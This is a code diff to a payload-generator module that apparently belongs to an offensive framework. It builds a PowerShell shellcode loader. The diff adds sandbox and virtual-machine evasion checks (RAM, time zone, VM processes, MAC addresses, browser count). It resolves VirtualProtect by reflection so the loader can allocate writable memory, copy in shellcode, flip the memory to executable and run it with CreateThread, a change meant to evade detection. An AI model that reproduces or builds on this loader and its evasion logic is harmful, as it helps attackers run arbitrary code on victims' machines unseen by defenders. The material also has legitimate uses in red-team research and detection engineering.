@@ -46,6 +46,13 @@ class PayloadModule:
             "DOMAIN"         : ["X", "Optional: Required internal domain"],
             "PROCESSORS"     : ["X", "Optional: Minimum number of processors"],
             "USERNAME"       : ["X", "Optional: The required user account"],
+            "USERPROMPT"     : ["FALSE", "Window pops up prior to payload"],
+            "MINRAM"         : ["FALSE", "Require a minimum of 3 gigs of RAM"],
+            "UTCCHECK"       : ["FALSE", "Check that system isn't using UTC time zone"],
+            "VIRTUALPROC"    : ["FALSE", "Check for known VM processes"],
+            "MINBROWSERS"    : ["FALSE", "Minimum of 2 browsers"],
+            "BADMACS"        : ["FALSE", "Checks for known bad mac addresses"],
+            "MINPROCESSES"   : ["X", "Minimum number of processes running"],
             "SLEEP"          : ["X", "Optional: Sleep \"Y\" seconds, check if accelerated"]
         }
 
@@ -73,10 +80,76 @@ class PayloadModule:
 [DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr u, uint v, IntPtr w, IntPtr x, uint y, IntPtr z);
 [DllImport("msvcrt.dll")] public static extern IntPtr memset(IntPtr x, uint y, uint z);
 "@\n"""
+
+            baseString += """Function Get-ProcAddress
+{
+    Param
+    (
+        [OutputType([IntPtr])]
+
+        [Parameter( Position = 0, Mandatory = $True )]
+        [String]
+        $Module,
+
+        [Parameter( Position = 1, Mandatory = $True )]
+        [String]
+        $Procedure
+    )
+
+    # Get a reference to System.dll in the GAC
+    $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
+        Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
+    $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
+    # Get a reference to the GetModuleHandle and GetProcAddress methods
+    $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
+    $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
+    # Get a handle to the module specified
+    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
+    $tmpPtr = New-Object IntPtr
+    $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
+
+    # Return the address of the function
+    Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
+}
+Function Get-DelegateType
+{
+    Param
+    (
+        [OutputType([Type])]
+
+        [Parameter( Position = 0)]
+        [Type[]]
+        $Parameters = (New-Object Type[](0)),
+
+        [Parameter( Position = 1 )]
+        [Type]
+        $ReturnType = [Void]
+    )
+
+    $Domain = [AppDomain]::CurrentDomain
+    $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
+    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
+    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
+    $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
+    $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
+    $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
+    $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
+    $MethodBuilder.SetImplementationFlags('Runtime, Managed')
+
+    Write-Output $TypeBuilder.CreateType()
+}\n"""
+
+            baseString += """$wut = New-Object System.Object
+$VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect
+$VirtualProtectDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
+$why = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VirtualProtectDelegate)
+$wut | Add-Member NoteProperty -Name VirtualProtect -Value $why\n"""
+
             baseString += checks
             baseString += """$o = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru
-$x=$o::VirtualAlloc(0,0x1000,0x3000,0x40); [Byte[]]$sc = %s;
+$x=$o::VirtualAlloc(0,0x1000,0x3000,0x04); [Byte[]]$sc = %s;
 for ($i=0;$i -le ($sc.Length-1);$i++) {$o::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1) | out-null;}
+$here=$wut.VirtualProtect.Invoke($x, [UInt32]0x1000, [UInt32]0x20, [Ref]0);
 $z=$o::CreateThread(0,0,$x,0,0,0); Start-Sleep -Second 100000""" % (Shellcode)
 
         elif self.required_options["INJECT_METHOD"][0].lower() == "heap":
